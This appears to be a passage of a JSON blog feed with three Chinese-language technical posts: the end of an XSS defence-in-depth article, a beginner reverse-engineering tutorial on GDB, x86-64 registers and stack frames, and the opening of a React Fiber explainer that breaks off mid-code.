過濾規則有沒有可能有漏洞，會被繞過？有的話又該怎麼繞？</li>\n<li>儘管都過濾了，會不會其實 server side 的漏洞可以幫忙繞過？例如說 double encoding</li>\n<li>CSP 設得夠嚴謹嗎？有沒有現成的繞過方式？</li>\n<li>2FA 機制有實作完整嗎？rate limit 有設好嗎？沒有設的話是不是暴力破解就被爆破了？</li>\n<li>忘記密碼的機制有實作正確嗎？會不會可以用別人的身份幫忙重設密碼？</li>\n</ol>\n<p>XSS 並不是全有或是全無這麼簡單，有的網站雖然被 XSS，但影響範圍有限，而有的網站一被 XSS，連使用者的帳號密碼都可以輕易更改，直接把帳號給搶過來。</p>\n<p>在防禦 XSS 的時候，如果只防禦了第一關，只有想到「我要把 render 的內容 escape」就容易造成上面所講的狀況，要嘛就是整個網站都很安全連 XSS 都沒有，要嘛就是一被打出 XSS，整個網站就被打穿。</p>\n<p>所以在防禦的時候必須注意到上面提的這些不同的環節，針對每個環節都去做防禦，設下多個防線。就算攻擊者可以突破第一關，可能也會被第二關的 CSP 擋下，無法執行 JS；就算第二關被破了，還有第三關守著，降低 XSS 的影響程度，不會因為一個漏洞就讓使用者的帳戶整個被搶走。</p>\n",
      "date_published": "2021-06-17T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/reverse-01/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/reverse-01/",
      "title": "Reverse Engineering 101 — Part 1",
      "content_html": "<!-- summary -->\n<!-- 很多人對逆向工程躍躍欲試卻不知道從何開始，又該具備哪些知識？這一篇文章會從逆向一個小程式，帶你建立基礎知識與想法！ -->\n<!-- summary -->\n<p>最近解一些 CTF 順便跟同事分享 Reversing 的一點基礎技巧，想說寫成文章分享一下。這篇是給技術小白的 Reversing 入門系列，零基礎第一課！</p>\n<p>本篇會用到的工具有：</p>\n<ol>\n<li>linux 或 Unix-like 作業系統</li>\n<li>GDB（GNU Debugger），一個不管靜態還是動態分析都很好用的 linux 內建工具</li>\n<li>滿滿的好奇心！</li>\n</ol>\n<h2 id=\"%E8%A9%B2%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E8%A9%B2%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%EF%BC%9F\">#</a> 該如何開始？</h2>\n<p>以下以一個簡單的<a href=\"https://github.com/OneDegree-Global/medium-resources/tree/main/reverse-101\">小程式</a>為例。</p>\n<p>今天拿到一個未知的檔案，我們該從何下手呢？首先，要知道我們的目標是什麼樣的檔案。我們可以用 linux 內建的 <code>file</code> 指令來辨識檔案類型。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/file.png\" alt=\"\"></p>\n<p>例如從上圖中我們可以觀察到幾件事：</p>\n<ol>\n<li>\n<p>這是一個 ELF 檔案（Executable Linkable Format），是 Unix 系統上常見的 binary 執行檔、共用函式庫、或是 object code 類型，也意味這我們可以直接在 linux 系統上把他跑起來 <sup class=\"footnote-ref\"><a href=\"#fn1\" id=\"fnref1\">[1]</a></sup></p>\n</li>\n<li>\n<p>記憶體的位元組順序（Endianness）採 LSB（Least Significant Bit），或是常說的 little endian，表示把最高位的位元組放在最高的記憶體位址上，如下圖所示。這表示當我們輸入 <code>1234</code> 的時候，在 GDB 等軟體裡觀察記憶體時會看到的是 <code>\\x34\\x33\\x32\\x31</code>，這部分我們等等用 GDB 會再看到。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/little-endian.png\" alt=\"\"></p>\n</li>\n<li>\n<p>libc 函數的調用為 dynamically linked，亦即程式跑起來的時候，作業系統才會做 linking，把各個要調用的 libc 函數的位置填到這隻程式的一張表裡，方便執行時查詢呼叫。如果是 statically linked，在編譯過程中就會直接把這些外部函數都一起包到程式裡面，產出一個比較肥大的檔案。就像有人製作筆記時，會把課本內容抄到筆記本上，這樣所有資料一目瞭然，馬上就能找到，缺點是筆記厚厚一本；也有人僅是標註對應的課本頁數，這樣筆記較為精簡輕便，不過缺點是要找資料時必須另外參照課本。<sup class=\"footnote-ref\"><a href=\"#fn2\" id=\"fnref2\">[2]</a></sup></p>\n</li>\n<li>\n<p>跑在 x86–64 （64 bits）的結構上，64 bits 跟 32 bits 不只在暫存器名稱上不同，在 system call 的呼叫上也不一樣。</p>\n</li>\n<li>\n<p><code>not stripped</code>，表示在編譯過程中，debugging 資訊沒有被去掉，我們還看的到各個函數跟變數的名稱等等。</p>\n</li>\n</ol>\n<p>接著就可以執行看看！跑起來如下圖所示，會先跟使用者要三個數字，然後進行某些判斷，錯誤就會像這樣印出 ‘nope.’。因此，我們可以判斷拿到 flag 的條件就是讓這三個數字符合某些關係，檢查通過了就會印出 flag。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/execution.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"gdb-%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F%E8%83%BD%E5%90%83%E5%97%8E%EF%BC%9F\"><a class=\"direct-link\" href=\"#gdb-%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F%E8%83%BD%E5%90%83%E5%97%8E%EF%BC%9F\">#</a> GDB 是什麼？能吃嗎？</h2>\n<p>GDB 的全名是 GNU Debugger，顧名思義就是可以讓你一邊執行一個檔案一邊看到裡面的細節，也可以設置中斷點來逐步檢視記憶體裡面存的東西跟執行順序，方便開發者抓蟲。他還有很多強大的功能跟插件，例如最常用的 peda、gef、pwndbg 等等，可以讓你很方便地看到不同區段的資料甚至產生 shellcode ，大家如果有興趣可以再去逛逛。</p>\n<p>首先，執行 <code>gdb &lt;filename&gt;</code> 就可以在 GDB 裡面載入這個執行檔。再來就是用 <code>info file</code> 來觀察這個程式的進入點跟各區段位置<sup class=\"footnote-ref\"><a href=\"#fn3\" id=\"fnref3\">[3]</a></sup>。編譯器運作時，會把負責邏輯的程式碼跟變數等資料分區存放並加上對應的標籤以供程式運行時存取。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/gdb-info.png\" alt=\"\"></p>\n<p>通常我們會注意的幾個比較重要的區段為：</p>\n<p>1. <code>.text</code>：放置可執行的程式碼。權限為唯讀。</p>\n<p>2. <code>.rodata</code>：已初始化的資料，例如你在程式裡面寫死的字串或是常數。權限為唯讀。</p>\n<p>3. <code>.data</code>：已初始化的資料，例如你在程式裡面使用的全域變數。權限為可讀可寫。</p>\n<p>4. <code>.bss</code>：未初始化的資料。權限為可讀可寫。</p>\n<p>我們知道開始執行的地方是 <code>0x400860</code> 後，就可以用 <code>disas</code> 反編譯這段程式碼。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/disas-start.png\" alt=\"\"></p>\n<p>我們會觀察到這個函數有一個名字 <code>_start</code>。之前說過，<code>not stripped</code> 表示函數名稱都有被保留，所以我們也可以用函數名稱當作 reference 對象，在反編譯跟設中斷點的時候使用這個名稱。</p>\n<p>但是我們的程式裡面沒有寫到 <code>_start</code> 這個函數啊，他是哪裡來的呢？其實在編譯的過程中，編譯器會加入一個進入點 <code>_start</code> 函數，負責初始化一些 gcc/glibc 的準備工作再呼叫我們的 <code>main</code>，可以想成是在我們的程式外多加一層包裝來整頓好環境再開始執行主邏輯。所以，我們可以看到在 <code>&lt;+36&gt;</code> 的地方呼叫 <code>&lt;__libc_start_main@plt&gt;</code>，其實也就是透過 libc 的函數再間接呼叫我們所撰寫的主程式 <code>main</code>。</p>\n<p>這裡我們打個岔，回去看一下前面提到的 little endian。下面這張圖是在 GDB 裡面用 <code>x/&lt;num&gt;&lt;unit&gt; addr</code> 去看記憶體的指令，unit 有 b（bytes = 1 byte）、h（halfword = 2 bytes）、w（word = 4 bytes）、g（giant word = 8 bytes）這幾種，表示一次看的單位是多少位元，前面的 num 就是看多少單位，所以 <code>x/4x 0x400cd0</code>就是從地址 <code>0x400cd0</code>開始讀取 4 個 4 byte 的記憶體。unit 預設是 w，x 就是延續用最後一次設的單位。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/gdb-endian.png\" alt=\"\"></p>\n<p>我們看到第一行的第一塊記憶體是紅色框起來的 <code>0x65746e45</code>，第二塊記憶體是黃色框起來的 <code>0x68742072</code>，那第三行一次讀 8 bytes 的時候怎麼順序交換變成黃色框在前面了呢？</p>\n<p>那就是因為 little endian 必須反過來讀，我們看到的 <code>\\x65\\x74\\x6e\\x45</code> 在記憶體裡面存的其實是 <code>\\x45\\x6e\\x74\\x65</code>，所以把第一行的框框們從屁股讀回來，黏一起就是 <code>\\x45\\x6e\\x74\\x65 \\x72\\x20\\x74\\x68</code>，就是第三行的第一個單位反過來的樣子啦！大家記得不要讀反囉！</p>\n<hr>\n<h2 id=\"%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98%EF%BC%9A%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80%E8%88%87%E8%A8%88%E7%AE%97%E6%A9%9F%E7%B5%90%E6%A7%8B\"><a class=\"direct-link\" href=\"#%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98%EF%BC%9A%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80%E8%88%87%E8%A8%88%E7%AE%97%E6%A9%9F%E7%B5%90%E6%A7%8B\">#</a> 基礎知識：組合語言與計算機結構</h2>\n<p>接下來，在進到 <code>main</code> 之前，先來講講一點基本的組合語言與計算機結構。</p>\n<p>組合語言是介於機器看得懂的二進位操作碼（opcode）與一般人看得懂的高階程式語言中間的一種低階語言，目的是讓二進位的程式變得可以閱讀與編輯。由於每一種 CPU 使用的機器指令（machine instruction）都不同，所以對應的組合語言也不一樣，這裡我們以 x86–64 為例介紹，遇到不懂或沒看過的都可以去查指令集哦。<sup class=\"footnote-ref\"><a href=\"#fn4\" id=\"fnref4\">[4]</a></sup></p>\n<p>最常見的指令如下，<code>S</code> 指 source，<code>D</code> 指 destination：</p>\n<ul>\n<li><code>mov D, S</code>：將某個值或是記憶體的位置寫入某個暫存器。把 <code>S</code> 裡面的值寫到 <code>D</code>裡面。</li>\n<li><code>push S</code>：將 <code>S</code> 裡面的值放到 stack 上。</li>\n<li><code>pop D</code>：把 stack 上的值放到 <code>D</code> 裡面，從 stack 移除。</li>\n<li><code>add D, S</code>、<code>sub D, S</code>：將 <code>S</code> 跟 <code>D</code> 裡面的值相加相減，結果放在 <code>D</code> 裡面。</li>\n<li><code>call Label</code>：呼叫帶有 Label 標籤的函數，這時程式會為這個函數創一個新的 stack frame。</li>\n<li><code>ret</code>：終止當前函數的執行，返回到上一層的函數。</li>\n</ul>\n<p>還有進行條件判斷的 <code>cmp</code>、<code>test</code> 跟各種跳躍的 <code>jmp</code> 家族，之後我們遇到再說明。</p>\n<p>要注意的是，上面的寫法是 Intel 語法，如果是 AT&amp;T 語法就將 <code>S</code> 跟 <code>D</code>反過來（如 <code>mov S,D</code>）。</p>\n<p>首先，我們必須先理解暫存器與記憶體。CPU 只跑指令，而資料儲存交給記憶體，當 CPU 需要用到資料時就會向記憶體請求。我們可以把記憶體想像成一間很小的圖書館，門口有一個櫃子放本週最熱門的書籍，進門後一樓放各個老師指定的課本與參考資料，其他書籍都放在地下倉庫內。那麼今天有學生想借書，他要是在門口一看就能找到想要的那本當然是最有效率的，不然他就得走進去，在層架間仔細翻找，也許要一個小時才能找到。要是更慘都沒有，還要勞煩管理員到倉庫裡搜尋，說不定要一兩天功夫才行。越多的資料量查詢起來越沒有效率，反之，越少的資料越能快速存取。</p>\n<p>記憶體常見的結構如下圖。最上層是 CPU 暫存器（register），是存取最快速頻繁也最小的記憶體。再往下至快取（cache）、RAM、 hard drive ，能存的資料越來越多、體積越來越大、存取速度也越來越慢。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/memory-model.png\" alt=\"\"></p>\n<p>要看懂組合語言，首要之務就是了解暫存器。</p>\n<p>在 x86–64 結構下，暫存器都是 64 bits = 8 bytes 大小<sup class=\"footnote-ref\"><a href=\"#fn5\" id=\"fnref5\">[5]</a></sup>，暫存器也可以部分存取，以 <code>rax</code> 為例，<code>eax</code> 指 <code>rax</code> 的後 4 bytes、再對切得到 <code>ax</code> 為倒數 2 bytes、然後再切分為 <code>ah</code> 與 <code>al</code>。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/reg-size.png\" alt=\"\"></p>\n<p>暫存器的種類也非常多，一般來說，有 16 個一般用途暫存器，為 <code>rax</code> <code>rbx</code> <code>rcx</code> <code>rdx</code> <code>rdi</code> <code>rsi</code> <code>rbp</code> <code>rsp</code> <code>r8-r15</code>，意指可能被用於任何運算操作。與之相對，屬於特殊用途暫存器的 <code>rip</code> <code>rflags</code>就不是可以拿來運算調用的。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/x64-regs.png\" alt=\"\"></p>\n<p>每個暫存器傳統上都有特殊用途，例如：</p>\n<ul>\n<li><code>rax</code> 常用於放函數回傳值跟乘除法運算結果</li>\n<li><code>rbx</code> 常用於放 base address</li>\n<li><code>rcx</code> 常用於回圈中的計數器（counter）</li>\n<li><code>rdx</code> 常用於存放資料</li>\n<li><code>rbp (base pointer)</code> 指向當前函數 stack 上的底部（stack frame 下緣）</li>\n<li><code>rsp (stack pointer)</code> 指向當前函數 stack 上的頂部（stack frame 上緣）</li>\n<li><code>rip (instruction pointer)</code> 指向下一個要執行的 CPU 指令</li>\n</ul>\n<p>再來，我們看看 stack 跟 heap 。C 程式一般的記憶體配置如下圖。上面是高的記憶體位址（<code>0xffff…</code>）下面是低的記憶體位址（<code>0x0000…</code>），heap 在 <code>.bss</code> 區段之後開始、隨著動態記憶體配置增加慢慢往上長，而 stack 則是從高的記憶體位址開始往下長。stack 放置的是靜態的、已知大小的資料，例如每一個函數內的區域變數以及函數的參數跟地址等等。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/memory-layout.png\" alt=\"\"></p>\n<p>程式執行時函數的呼叫就會以 stack frame 的方式層層堆疊，也可以想成記憶體是一個直立式的櫃子、每個函數是一本一本的書籍，裡面記載了這個函數內的各種變數，當一個函數被呼叫時，就把這本書平放到櫃子中書堆的最上面，完成後再從書堆上拿下來。</p>\n<p>那麼，誰去管理這個櫃子中的書堆，確保書籍有好好的被堆疊跟移除呢？</p>\n<p>管理函數之間參數傳遞、並規定誰負責清除堆疊的一套約定，我們稱為 calling convention ，或是國家教育研究院譯為呼叫約定。在不同的系統架構下會有不同的 calling convention，以 AMD64 系統（用於 Solaris、Linux、FreeBSD、MacOS 等 Unix 跟 Unix-like 系統）的 x86–64 為例，儲存函數前六個參數的暫存器依序為 <code>rdi</code> <code>rsi</code> <code>rdx</code> <code>rcx</code> <code>r8</code> <code>r9</code>，而函數 return 的回傳值則會放在 <code>rax</code> 中（若大於一個暫存器的空間，例如回傳值在 64–128 bit，則會放在 <code>rax</code> 跟 <code>rdx</code>）。在呼叫一個函數前，呼叫者（caller）會把被呼叫的函數（callee）的參數放到暫存器中，再透過 <code>call</code> 這個指令去執行 callee。而進入 callee 後，在進行主邏輯前，callee 會先創造自己的 stack frame，在 stack 上留一塊記憶體空間。邏輯執行結束時，用 <code>leave</code> 把 stack frame 裡的東西清掉，最後 <code>ret</code> 把控制權交回 caller。</p>\n<p>『創造自己的 stack frame』這個動作又稱為 function prologue，可以類比為書的前言、鋪成。實作上其實有一個組語指令叫 <code>enter n,0</code>，不過因為他太慢了，所以通常用下面這段取代：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">push  ebp<br>mov   ebp, esp     # ebp = esp<br>sub   esp,  $n     # allocate space on the stack</code></pre>\n<p>搭配下圖由左而右來看，藍色區塊是 caller 的 stack frame，黃色是進行 <code>call</code> 後把當前執行到的地方，也就是等等 callee 結束執行要返回的地方給存起來。第一行的 <code>push</code> 把當前的 <code>ebp</code> 放到 stack 上面，等同存好現在的 stack 基底，方便函數結束後回復到前一個函數的狀態，此時 stack 從左一變成左二，多了綠色的部分。第二行把 <code>ebp</code> 指到現在 <code>esp</code> 的位置，stack 從左二變成左三。第三行把 <code>esp</code> 向上移大小為 n 的空間，也就是預留出 callee 函數所需要的記憶體，stack 變成最後一張，創造出了紅色部分的另一個 stack frame。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/prologue.png\" alt=\"\"></p>\n<p>『清掉自己的 stack frame』這個動作又稱為 function epilogue，可以類比為書的後言。使用的組語指令叫 <code>leave</code>，概念上等同下面這段：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">mov   esp, ebp     # esp = ebp<br>pop   ebp          # restore old ebp</code></pre>\n<p>搭配下圖由左而右來看，原始狀態就是前面 function prologue 完的樣子。第一行把 <code>esp</code> 指回 <code>ebp</code> 的地方，stack 從左一變成左二，這下子紅色的 callee stack frame 就被釋放出來了。第二行把 stack 上的值拿下來放回 <code>ebp</code>，也就是把舊的 <code>ebp</code> 位置還原回來，stack 變成最右邊的樣子，當前的記憶體最上面就回到 caller 的 stack frame 了。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/epilogue.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>到這裡為止，我們其實都還沒開始逆向呢XDDD 先具備一些基礎知識是很重要的，知己知彼才能見招拆招嘛！</p>\n<p>這一篇我們先講解了逆向的起手式、基本的組合語言以及計算機結構、還有編譯完的程式碼以及記憶體的運作方式。上面只是針對AMD 的 x86–64 這一種結構做說明，有興趣的話可以去查查不同結構下的組合語言指令集跟 calling convention，可是很不同的喔！你也可以把這篇用到的小程式跟你電腦上別的程式用 GDB 或是 IDA 打開來看看，比較一下差異。</p>\n<p>總之，我們總算把前置準備完成，下一集我們來正式開始看 <code>main</code> ！</p>\n<hr class=\"footnotes-sep\">\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p>小提醒：千萬別執行來路不明的檔案哦！一般來說提供軟體的廠商都會在下載點提供一個 MD5 checksum，也就是將這個檔案的資料做雜湊運算得出的一個值，你可以利用 linux 內建的 <code>md5sum</code> 指令驗明正身！如果 <code>md5sum &lt;file&gt;</code> 的到的結果跟網站標示的一樣才是對的！ <a href=\"#fnref1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n<li id=\"fn2\" class=\"footnote-item\"><p>在 dynamically linked 的時候，如果想看到有哪些外部函示庫被調用，以及他們的 base address，可以用 <code>ldd &lt;filename&gt;</code> 查看，這部分的利用以後有 pwn 入門系列再來說明 XDD <a href=\"#fnref2\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n<li id=\"fn3\" class=\"footnote-item\"><p>或者我們也可以用 <code>objdump</code> 來看各區段的位置以及權限，指令為 <code>objdump -h &lt;filename&gt;</code>，同一個檔案的輸出會長這樣 <a href=\"#fnref3\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n<li id=\"fn4\" class=\"footnote-item\"><p>指令集：<a href=\"https://software.intel.com/content/www/us/en/develop/articles/intel-sdm.html\">Intel 64 &amp; 32 bits</a>、<a href=\"https://en.wikipedia.org/wiki/X86_instruction_listings\">維基百科</a>、<a href=\"https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf\">x64 cheat sheet</a> <a href=\"#fnref4\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n<li id=\"fn5\" class=\"footnote-item\"><p>另外其實有 128 bit 的暫存器，例如用來傳遞浮點數的參數時使用的是 <code>XMM</code> 系列，calling convention 跟一般用途暫存器類似，<code>XMM0-XMM7</code> 用於傳遞參數，回傳值則會放在 <code>XMM0</code></p>\n<p><img src=\"/img/posts/crystal/reverse-01/objdump.png\" alt=\"\"> <a href=\"#fnref5\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</section>\n",
      "date_published": "2021-06-04T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/mingyou/deep-dive-into-react-fiber/",
      "url": "https://tech-blog.cymetrics.io/posts/mingyou/deep-dive-into-react-fiber/",
      "title": "隱藏在 React 下的機制： Fiber",
      "content_html": "<p>不知不覺都 2021 年中了，從 React 16.3 的重大更新後也已經過了兩年多了，不知到大家還記不記得當時的兩大重要功能，其一為 Function Component ( hooks )，另一個大家比較不那麼熟悉但卻也很重要的則應該屬 Fiber 架構，但其實會有 hook 的設計也是也是因為上述架構的關係。</p>\n<p>在當時引想大家最多的應該屬生命週期的變換，不曉得大家是否還記得當時最常用到的生命週期 <code>componentWillUpdate</code>/<code>componentWillReceiveProps</code> 將被廢除時驚訝的心情? 而當時也加入了兩個新的 lifecycle 來解決以上問題。</p>\n<ul>\n<li>getDerivedStateFromProps</li>\n<li>getSnapshotBeforeUpdate</li>\n</ul>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p1.png\" alt=\"Re: React 常用的生命週期(1)\"><br>\n<a href=\"https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/\">https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/</a></p>\n<p>至於為什麼會產生以下的變化呢？這就要說說本次的主題 Fiber 了。</p>\n<h2 id=\"fiber-%E6%98%AF%E4%BB%80%E9%BA%BC\"><a class=\"direct-link\" href=\"#fiber-%E6%98%AF%E4%BB%80%E9%BA%BC\">#</a> Fiber 是什麼</h2>\n<p>Fiber 屬於更為底層的抽象行為，目的是為了達到以下幾種功能</p>\n<ul>\n<li>幫不同類型的工作分配優先順序</li>\n<li>暫停工作，稍後回來</li>\n<li>當不需要工作時取消</li>\n<li>重新使用已經完成的工作</li>\n</ul>\n<!-- summary -->\n<p>在尚未使用 Fiber 前，由於畫面更新前須由 reconciler ( React ) 調度完後才會送到 renderer，且當畫面複雜時，更動一個 state 狀態時也需要將底下的所有子元件重新 render 出一份 virtual dom，而在過去這個部分全部只由一個主線程去做同步式渲染，因此當有一個 Component 需要費時較多時間時，將會把主線程 block，當時間一長，就有可能導致來不及更新至指定時間範圍內，造成無法順利渲染，會有不順暢的情況發生。</p>\n<!-- summary -->\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p2.png\" alt=\"Re: sync mode 和 async mode 的差異\"><br>\n<a href=\"https://twitter.com/acdlite/status/977291318324948992\">https://twitter.com/acdlite/status/977291318324948992</a></p>\n<h2 id=\"fiber-%E7%9A%84%E7%94%A2%E7%94%9F%E5%8F%8A%E4%BD%9C%E7%94%A8\"><a class=\"direct-link\" href=\"#fiber-%E7%9A%84%E7%94%A2%E7%94%9F%E5%8F%8A%E4%BD%9C%E7%94%A8\">#</a> Fiber 的產生及作用</h2>\n<p>為了解決此問題，React 制定了 fiber 的結構，利用非同步的渲染方式來解決，將各元件拆解，也避免了長時間占用主線程所導致卡頓的問題。 ( 所使用的 <a href=\"https://developer.mozilla.org/zh-TW/docs/Web/API/Window/requestIdleCallback\">API</a>， <a href=\"https://github.com/facebook/react/blob/4c7036e807fa18a3e21a5182983c7c0f05c5936e/packages/react-reconciler/src/ReactFiberWorkLoop.new.js#L1541\">source code</a> )</p>\n<p>傳統 React 更新時會分成兩個時期</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p3.png\" alt=\"Re: React 更新時期\"></p>\n<ul>\n<li>reconciliation / render 階段 ( 判斷哪先元件需要更新，可中斷 )</li>\n<li>commit 階段 ( 插入、移動、刪除節點，不可中斷 )</li>\n</ul>\n<!--（有誤 需更正） commit phase 的執行很快，而 render phase 產生真實 DOM 的時間卻很久，因此在 react 更新元件時可能會中斷更新以避免阻塞瀏覽器，也代表可能會因為被中斷而重新執行，所以必須保持沒有 side effect 的情況來避免非預期的情況。 -->\n<p>reconciliation phase 會先通過 render 更新元件，在第一次實建立 Fiber 節點，並在之後更新與上一次所渲染的 DOM 比較，因此在 render 階段將執行以下生命週期方法判斷是否有更新：</p>\n<ul>\n<li>componentWillMount (已廢棄)</li>\n<li>componentWillReceiveProps (已廢棄)</li>\n<li>componentWillUpdate (已廢棄)</li>\n<li>getDerivedStateFromProps</li>\n<li>shouldComponentUpdate</li>\n</ul>\n<p>react 可以根據目前的狀況調整，可以選擇一次處理單個或者多個 fiber 並且調整優先權，因此可以異步執行及中斷，但也因為如此，內部的邏輯必須避免 side effect。</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p4.png\" alt=\"Re: Commit phrase 和 render phrase\"></p>\n<p>在 render 階段執行完後將會產生包含著 side effect 的 fiber 節點樹，而 side effect 事實上就是 commit 階段所需要更新操作，會在執行 commit 階段時輪詢 side effect 列表去對 DOM 進行修改。</p>\n<p>以下是commit階段執行的生命週期方法列表：</p>\n<ul>\n<li>getSnapshotBeforeUpdate</li>\n<li>componentDidMount</li>\n<li>componentDidUpdate</li>\n<li>componentWillUnmount</li>\n</ul>\n<p>因為這些方法在同步commit階段執行，所以它們可能包含副作用或更動 DOM。</p>\n<p>而前面說到被廢除的兩個 lifecycle 因為是屬於 render phase，有機會被多次執行，為了避免 side effect 發生，才會移除此 lifecycle。</p>\n<ul>\n<li><code>componentWillUpdate</code></li>\n<li><code>componentWillReceiveProps</code></li>\n</ul>\n<p>而拿掉以上 API 後則利用 <code>getDerivedStateFromProps</code> 來取代 <code>componentWillReceiveProps</code>，但由於 <code>getDerivedStateFromProps</code> 被設計成靜態函數，不用擔心 side effect 所帶來的影響，不過要避免從 props 等等去觸發 side effect。</p>\n<h2 id=\"fiber-nodes-%E5%92%8C-fiber-tree\"><a class=\"direct-link\" href=\"#fiber-nodes-%E5%92%8C-fiber-tree\">#</a> Fiber nodes 和 Fiber tree</h2>\n<p>在 reconciliation 時，每個 component 的 render 方法回傳的資料都會合併到 Fiber tree 中，每個React元素都有一個對應的 Fiber nodes，用來記錄對應的工作內容，而特別的地方在於在每次 render 時不會重新產生 Fiber node。</p>\n<p>更確切的說，每個 Fiber 就是一個 worker ，提供了跟踪，調度，暫停和中止工作的方法。</p>\n<p>每一個 Fiber Node 節點與 Virtual Dom 對應，所有 Fiber Node 連接起來形成 Fiber tree，為單向連結串列的樹狀結構：<br>\n<img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p5.png\" alt=\"Re: Fiber tree\"></p>\n<p>主要是為了將原本的樹狀遞迴輪詢轉變成循環輪詢，配合 requestIdleCallback API, 實現任務拆分、中斷與恢復。</p>\n<p>大概結構如下：</p>\n<pre class=\"language-js\"><code class=\"language-js\">type Fiber <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token comment\">// 標籤類型</span><br>  tag<span class=\"token operator\">:</span> TypeOfWork<span class=\"token punctuation\">,</span><br><br>  key<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">|</span> string<span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 與 Fiber 所關聯的類型</span><br>  type<span class=\"token operator\">:</span> any<span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// local 狀態</span><br>  stateNode<span class=\"token operator\">:</span> any<span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 以下區塊負責處理 Fiber</span><br><br>  <span class=\"token keyword\">return</span><span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 單向連結串列結構</span><br>  child<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br>  sibling<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br>  index<span class=\"token operator\">:</span> number<span class=\"token punctuation\">,</span><br><br>  <span class=\"token operator\">...</span><br><br><br>  <span class=\"token comment\">// 輸出用的狀態</span><br>  memoizedState<span class=\"token operator\">:</span> any<span class=\"token punctuation\">,</span><br><br>  <span class=\"token operator\">...</span><br><br>  <span class=\"token comment\">// 紀錄在單向鏈結串列中的下一個 Fiber </span><br>  nextEffect<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 子樹中具有 side effect 的第一個和最後一個光纖</span><br>  <span class=\"token comment\">// 當我們重用已完成的工作時，我們重用 link list 的一部分</span><br>  firstEffect<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br>  lastEffect<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 快速確定子樹是否沒有正在等待的更動</span><br>  pendingWorkPriority<span class=\"token operator\">:</span> PriorityLevel<span class=\"token punctuation\">,</span><br><br><br>  <span class=\"token comment\">// 如果工作在光纖上進行，而該光纖已經在較低的優先權開始了一部分工作</span><br>  <span class=\"token comment\">// 那麼我們需要將已完成的工作儲存著。直到我們需要重新開始處理它為止</span><br>  <span class=\"token comment\">// 它可能與 \"目前\" 的 child 不同。</span><br>  progressedChild<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token operator\">...</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>在這結構中，nextEffect / firstEffect / lastEffect 將在後面的章節 ( Effect List ) 中表現出相當的重要性。</p>\n<h2 id=\"workinprogress-tree\"><a class=\"direct-link\" href=\"#workinprogress-tree\">#</a> workInProgress tree</h2>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">createWorkInProgress</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">current<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span></span><span class=\"token punctuation\">)</span> <span class=\"token 